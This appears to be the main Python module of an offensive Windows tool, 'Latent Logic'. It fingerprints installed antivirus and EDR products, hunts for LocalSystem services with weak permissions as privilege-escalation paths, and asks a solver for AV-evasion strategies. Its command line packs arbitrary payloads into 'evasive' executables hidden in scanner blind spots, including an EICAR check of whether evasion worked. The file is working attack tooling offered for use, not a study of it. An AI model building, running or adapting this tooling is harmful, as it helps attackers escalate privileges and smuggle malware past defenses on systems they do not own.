"""
Latent Logic - Main System

The unified interface that ties together:
  - Ingestor (gather system state)
  - Solver (Z3 reasoning)
  - Knowledge (AV profiles, operations)
  - Output (recommendations)
"""

import subprocess
import re
import os
from typing import List, Dict, Optional, Set
from dataclasses import dataclass

from .state import SystemState, Integrity, UserType, Goal
from .solver import UnifiedSolver, SolverResult
from .knowledge import KnowledgeBase, get_av_profile, AV_NAME_MAP


class LatentLogic:
    """
    Main Latent Logic system.
    
    Usage:
        ll = LatentLogic()
        ll.analyze()           # Scan current system
        ll.find_privesc()      # Find path to SYSTEM
        ll.find_evasion()      # Find AV evasion strategy
        ll.report()            # Print full report
    """
    
    # Known AV process names -> friendly names
    AV_PROCESSES = {
        'MsMpEng.exe': 'Windows Defender',
        'SecurityHealthService.exe': 'Windows Defender',
        'avp.exe': 'Kaspersky',
        'ekrn.exe': 'ESET NOD32',
        'SavService.exe': 'Sophos',
        'SentinelAgent.exe': 'SentinelOne',
        'CSFalconService.exe': 'CrowdStrike Falcon',
        'bdagent.exe': 'BitDefender',
        'AvastSvc.exe': 'Avast',
        'AVGSvc.exe': 'AVG',
        'NortonSecurity.exe': 'Norton',
        'ccSvcHst.exe': 'Symantec',
        'fmon.exe': 'F-Secure',
        'dwengine.exe': 'Dr.Web',
        'MBAMService.exe': 'Malwarebytes',
        'PccNTMon.exe': 'TrendMicro',
        'taniumclient.exe': 'Tanium',
        'elastic-agent.exe': 'Elastic',
        'cb.exe': 'Carbon Black',
    }
    
    def __init__(self):
        self.state = SystemState()
        self.kb = KnowledgeBase()
        self.solver = UnifiedSolver()
        
        self._privesc_result: Optional[SolverResult] = None
        self._evasion_result: Optional[SolverResult] = None
    
    # =========================================================================
    # INGESTION - Gather system state
    # =========================================================================
    
    def analyze(self) -> SystemState:
        """
        Analyze current system and populate state.
        
        This is the main entry point - run this first.
        """
        print("[*] Analyzing system state...")
        print()
        
        self._ingest_user_context()
        self._ingest_security_products()
        self._ingest_attack_surface()
        self._ingest_network()
        
        # Connect state to solver
        self.solver.set_state(self.state)
        
        return self.state
    
    def _ingest_user_context(self):
        """Get current user privileges and integrity."""
        print("[*] Checking user context...")
        
        try:
            # Username
            result = subprocess.run(
                'whoami', shell=True, capture_output=True, text=True, timeout=5
            )
            self.state.username = result.stdout.strip()
            
            if 'system' in self.state.username.lower():
                self.state.user_type = UserType.SYSTEM
                self.state.integrity = Integrity.SYSTEM
            
            # Privileges
            result = subprocess.run(
                'whoami /priv', shell=True, capture_output=True, text=True, timeout=5
            )
            privs = set()
            for line in result.stdout.split('\n'):
                if 'Enabled' in line:
                    match = re.search(r'(Se\w+Privilege)', line)
                    if match:
                        privs.add(match.group(1))
            self.state.update_privileges(privs)
            
            # Groups and integrity
            result = subprocess.run(
                'whoami /groups', shell=True, capture_output=True, text=True, timeout=5
            )
            output = result.stdout
            
            if 'High Mandatory Level' in output:
                self.state.integrity = Integrity.HIGH
            elif 'System Mandatory Level' in output:
                self.state.integrity = Integrity.SYSTEM
            elif 'Low Mandatory Level' in output:
                self.state.integrity = Integrity.LOW
            else:
                self.state.integrity = Integrity.MEDIUM
            
            if 'S-1-5-32-544' in output:  # Administrators SID
                self.state.groups.add('Administrators')
                self.state.user_type = UserType.ADMIN
            
            # Recompute flags after setting groups
            self.state._compute_flags()
            
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    def _ingest_security_products(self):
        """Detect installed AV/EDR."""
        print("[*] Detecting security products...")
        
        try:
            result = subprocess.run(
                'tasklist /fo csv', shell=True, capture_output=True, text=True, timeout=10
            )
            processes = result.stdout.lower()
            
            seen = set()
            for proc, av_name in self.AV_PROCESSES.items():
                if proc.lower() in processes and av_name not in seen:
                    seen.add(av_name)
                    # Classify as EDR or AV
                    if av_name in ['Carbon Black', 'Tanium', 'Elastic', 'CrowdStrike Falcon']:
                        self.state.edr_products.append(av_name)
                    else:
                        self.state.av_products.append(av_name)
            
            # Check Defender service
            result = subprocess.run(
                'sc query WinDefend', shell=True, capture_output=True, text=True, timeout=5
            )
            self.state.defender_enabled = 'RUNNING' in result.stdout
            
            # Check AMSI
            self.state.amsi_enabled = True  # Assume enabled, hard to check from Python
            
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    def _ingest_attack_surface(self):
        """Find exploitable services, tasks, paths."""
        print("[*] Scanning attack surface...")
        
        try:
            # Check for modifiable services
            result = subprocess.run(
                'sc query type= service state= all',
                shell=True, capture_output=True, text=True, timeout=30
            )
            services = re.findall(r'SERVICE_NAME:\s+(\S+)', result.stdout)
            
            for svc in services[:30]:
                try:
                    cfg = subprocess.run(
                        f'sc qc "{svc}"',
                        shell=True, capture_output=True, text=True, timeout=5
                    )
                    
                    if 'LocalSystem' not in cfg.stdout:
                        continue
                    
                    sd = subprocess.run(
                        f'sc sdshow "{svc}"',
                        shell=True, capture_output=True, text=True, timeout=5
                    )
                    
                    # Check for weak ACEs
                    if any(x in sd.stdout for x in ['(A;;RPWP;;;AU)', '(A;;GA;;;AU)', '(A;;RPWP;;;BU)']):
                        binary = re.search(r'BINARY_PATH_NAME\s*:\s*(.+)', cfg.stdout)
                        self.state.modifiable_services.append({
                            'name': svc,
                            'binary': binary.group(1).strip() if binary else 'Unknown'
                        })
                        
                except:
                    continue
                    
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    def _ingest_network(self):
        """Check domain membership."""
        print("[*] Checking network context...")
        
        try:
            result = subprocess.run(
                'systeminfo', shell=True, capture_output=True, text=True, timeout=30
            )
            
            match = re.search(r'Domain:\s+(\S+)', result.stdout)
            if match:
                domain = match.group(1)
                if domain.lower() != 'workgroup':
                    self.state.domain_joined = True
                    self.state.domain_name = domain
                    
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    # =========================================================================
    # SOLVING - Z3 reasoning
    # =========================================================================
    
    def find_privesc(self, target: Integrity = Integrity.SYSTEM) -> SolverResult:
        """Find path to target integrity level."""
        self._privesc_result = self.solver.solve_privesc(target)
        return self._privesc_result
    
    def find_evasion(self, av_names: Optional[List[str]] = None) -> SolverResult:
        """Find evasion strategy for installed or specified AVs."""
        if av_names is None:
            av_names = self.state.av_products + self.state.edr_products
        
        self._evasion_result = self.solver.solve_evasion(av_names)
        return self._evasion_result
    
    def find_combined(self) -> Dict:
        """Find combined privesc + evasion strategy."""
        av_names = self.state.av_products + self.state.edr_products
        return self.solver.solve_combined(Integrity.SYSTEM, av_names)
    
    # =========================================================================
    # OUTPUT - Reports and recommendations
    # =========================================================================
    
    def report(self):
        """Print full analysis report."""
        self._print_state()
        
        # Run solvers if not already run
        if self._privesc_result is None:
            self.find_privesc()
        if self._evasion_result is None:
            self.find_evasion()
        
        self._print_privesc()
        self._print_evasion()
    
    def _print_state(self):
        """Print current state."""
        s = self.state
        
        print()
        print("=" * 60)
        print("SYSTEM STATE")
        print("=" * 60)
        
        print()
        print("[USER CONTEXT]")
        print(f"  Username:    {s.username}")
        print(f"  Integrity:   {s.integrity.name}")
        print(f"  Admin:       {s.user_type == UserType.ADMIN or 'Administrators' in s.groups}")
        print(f"  SYSTEM:      {s.integrity == Integrity.SYSTEM}")
        if s.privileges:
            print(f"  Privileges:  {', '.join(list(s.privileges)[:5])}")
            if len(s.privileges) > 5:
                print(f"               ...and {len(s.privileges)-5} more")
        
        print()
        print("[SECURITY PRODUCTS]")
        if s.av_products:
            print(f"  AV:          {', '.join(s.av_products)}")
        else:
            print(f"  AV:          None detected")
        if s.edr_products:
            print(f"  EDR:         {', '.join(s.edr_products)}")
        print(f"  Defender:    {'Enabled' if s.defender_enabled else 'Disabled'}")
        print(f"  AMSI:        {'Enabled' if s.amsi_enabled else 'Disabled'}")
        
        print()
        print("[ATTACK SURFACE]")
        print(f"  Modifiable services: {len(s.modifiable_services)}")
        for svc in s.modifiable_services[:3]:
            print(f"    - {svc['name']}")
        
        print()
        print("[NETWORK]")
        print(f"  Domain:      {s.domain_name if s.domain_joined else 'Not joined'}")
    
    def _print_privesc(self):
        """Print privesc results."""
        r = self._privesc_result
        
        print()
        print("=" * 60)
        print("PRIVILEGE ESCALATION")
        print("=" * 60)
        
        if r.success:
            print()
            print(f"[+] BEST PATH (confidence: {r.confidence:.0%}, risk: {r.details.get('risk', '?')}/5)")
            print()
            for i, step in enumerate(r.path, 1):
                print(f"  {i}. {step}")
            print()
            print(f"  {r.explanation}")
            
            if r.details.get('techniques'):
                print(f"  MITRE: {', '.join(r.details['techniques'])}")
            
            # Show chain type summary
            all_paths = r.details.get('all_paths', [])
            if len(all_paths) > 1:
                # Count by type
                types = {}
                for p in all_paths:
                    t = p['type']
                    types[t] = types.get(t, 0) + 1
                
                print()
                print(f"[*] ALL PATHS: {len(all_paths)} total")
                type_summary = ', '.join(f"{count} {t}" for t, count in sorted(types.items()))
                print(f"    ({type_summary})")
                print()
                
                # Show top alternatives
                print("[*] TOP ALTERNATIVES:")
                print()
                for path in all_paths[1:8]:  # Show up to 7 alternatives
                    steps = ' → '.join(path['steps'])
                    print(f"  [{path['type']:12}] {steps}")
                    print(f"                 Risk: {path['risk']}/5 | MITRE: {', '.join(path['techniques'][:2])}")
                
                if len(all_paths) > 8:
                    print(f"  ... and {len(all_paths)-8} more paths")
        else:
            print()
            print(f"[-] No path found")
            print(f"    {r.explanation}")
    
    def _print_evasion(self):
        """Print evasion results."""
        r = self._evasion_result
        
        print()
        print("=" * 60)
        print("AV EVASION")
        print("=" * 60)
        
        if not self.state.av_products and not self.state.edr_products:
            print()
            print("[*] No AV/EDR detected")
            return
        
        if r.success:
            print()
            print(f"[+] EVASION STRATEGY (confidence: {r.confidence:.0%})")
            print()
            print(f"  Technique:   {r.path[0] if r.path else 'N/A'}")
            print(f"  Region:      {r.details.get('region', 'N/A')}")
            print(f"  Effectiveness: {r.details.get('effectiveness', 0):.0%}")
            print()
            print(f"  {r.explanation}")
            print()
            
            # Show per-AV blind spots
            print("  Per-AV analysis:")
            for av in self.state.av_products + self.state.edr_products:
                profile = get_av_profile(av)
                if profile:
                    blind = profile.get('blind_to', [])
                    print(f"    {av}: blind to {', '.join(blind)}")
                else:
                    print(f"    {av}: no profile (assume 93% blind)")
        else:
            print()
            print(f"[-] No common evasion found")
            print(f"    {r.explanation}")


# =============================================================================
# CLI
# =============================================================================

def main():
    """Command-line interface."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Latent Logic - Security Analysis System",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python -m latent_logic                    Full analysis
  python -m latent_logic --privesc          Focus on privilege escalation
  python -m latent_logic --evasion          Focus on AV evasion
  python -m latent_logic --state            Just show current state
  python -m latent_logic --generate payload.bin --strategy pe_overlay
        """
    )
    
    parser.add_argument('--state', action='store_true', help='Only show system state')
    parser.add_argument('--privesc', action='store_true', help='Focus on privesc')
    parser.add_argument('--evasion', action='store_true', help='Focus on evasion')
    parser.add_argument('--av', nargs='+', help='Specific AVs to evade')
    parser.add_argument('--generate', metavar='PAYLOAD', help='Generate evasive file from payload')
    parser.add_argument('--test', action='store_true', help='Use test payload (NOP sled + ret)')
    parser.add_argument('--demo', action='store_true', help='Generate demo that pops MessageBox')
    parser.add_argument('--eicar', action='store_true', help='Generate EICAR test file in blind spot (tests AV evasion)')
    parser.add_argument('--strategy', choices=['pe_overlay', 'pe_header', 'file_end', 'file_middle'],
                       default='pe_overlay', help='Evasion strategy for generation')
    parser.add_argument('--carrier', metavar='FILE', help='Carrier PE file to embed payload in')
    parser.add_argument('--output', '-o', metavar='FILE', help='Output filename')
    
    args = parser.parse_args()
    
    print()
    print("=" * 60)
    print("LATENT LOGIC v3.1")
    print("Bombadil Systems LLC")
    print("=" * 60)
    print()
    
    # Handle generate command separately (doesn't need system analysis)
    if args.generate or args.test or args.demo or args.eicar:
        from .generator import PayloadGenerator
        
        print(f"[*] Generating evasive payload...")
        print(f"    Strategy: {args.strategy}")
        
        # Get payload
        if args.eicar:
            # EICAR test string - should trigger AV if they scan the region
            payload = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
            print(f"    Payload:  [EICAR] Standard AV test string ({len(payload)} bytes)")
            print()
            print("    This file contains EICAR in a blind spot region.")
            print("    If your AV doesn't flag it, the evasion worked!")
            print()
        elif args.demo:
            # Generate a complete demo EXE that shows a MessageBox
            # This creates a fully functional PE, not just shellcode
            from .generator import create_demo_exe
            
            print(f"    Payload:  [DEMO] MessageBox popup")
            
            output_file = args.output or f"demo_{args.strategy}.exe"
            demo_data = create_demo_exe(args.strategy)
            
            with open(output_file, 'wb') as f:
                f.write(demo_data)
            
            print()
            print(f"[+] Generated: {output_file}")
            print(f"    Size:      {len(demo_data)} bytes")
            print(f"    Run it to see MessageBox from AV blind spot!")
            print()
            print("=" * 60)
            return
            
        elif args.test:
            # Test payload: NOP sled + INT3 + xor eax,eax + ret
            payload = bytes([0x90] * 16 + [0xCC, 0x31, 0xC0, 0xC3])
            print(f"    Payload:  [TEST] NOP sled + breakpoint ({len(payload)} bytes)")
        else:
            # Read payload from file
            try:
                with open(args.generate, 'rb') as f:
                    payload = f.read()
                print(f"    Payload:  {args.generate} ({len(payload)} bytes)")
            except FileNotFoundError:
                print(f"[!] Error: Payload file not found: {args.generate}")
                return
        
        # Read carrier if specified
        carrier = None
        if args.carrier:
            try:
                with open(args.carrier, 'rb') as f:
                    carrier = f.read()
                print(f"    Carrier:  {args.carrier} ({len(carrier)} bytes)")
            except FileNotFoundError:
                print(f"[!] Error: Carrier file not found: {args.carrier}")
                return
        
        # Generate
        gen = PayloadGenerator()
        result = gen.generate(payload, args.strategy, carrier)
        
        # Write output
        output_file = args.output or f"evasive_{args.strategy}.exe"
        with open(output_file, 'wb') as f:
            f.write(result.data)
        
        print()
        print(f"[+] Generated: {output_file}")
        print(f"    Size:      {len(result.data)} bytes")
        print(f"    Payload:   offset 0x{result.payload_offset:X}, {result.payload_size} bytes")
        print(f"    Strategy:  {result.strategy.name}")
        print(f"    {result.description}")
        
        print()
        print("=" * 60)
        return
    
    ll = LatentLogic()
    ll.analyze()
    
    if args.state:
        ll._print_state()
    elif args.privesc:
        ll._print_state()
        ll.find_privesc()
        ll._print_privesc()
    elif args.evasion:
        ll._print_state()
        av_names = args.av if args.av else None
        ll.find_evasion(av_names)
        ll._print_evasion()
    else:
        ll.report()
    
    print()
    print("=" * 60)
    print()


if __name__ == "__main__":
    main()
